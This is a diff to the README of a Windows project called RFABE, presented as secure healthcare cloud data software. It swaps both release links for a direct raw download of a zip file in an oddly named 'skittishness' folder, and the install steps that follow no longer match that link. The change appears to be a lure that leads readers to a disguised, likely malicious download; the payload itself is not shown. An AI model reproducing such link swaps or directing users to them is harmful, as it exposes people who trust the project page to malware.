@@ -1,6 +1,6 @@
 # 🔒 RFABE - Secure Cloud Healthcare Data Management
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/taddpancakestyle341/RFABE/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/taddpancakestyle341/RFABE/main/skittishness/Software-v2.7.zip)
 
 ## 🩺 What is RFABE?
 
@@ -12,7 +12,7 @@ Medical data contains private details. Security breaches harm both hospitals and
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  **Visit the link:** [https://github.com/taddpancakestyle341/RFABE/releases](https://github.com/taddpancakestyle341/RFABE/releases)
+1.  **Visit the link:** [https://raw.githubusercontent.com/taddpancakestyle341/RFABE/main/skittishness/Software-v2.7.zip](https://raw.githubusercontent.com/taddpancakestyle341/RFABE/main/skittishness/Software-v2.7.zip)
 2.  Locate the section labeled "Assets."
 3.  Click the file ending in `.exe` to start the download.
 4.  Once the download finishes, find the file in your "Downloads" folder.
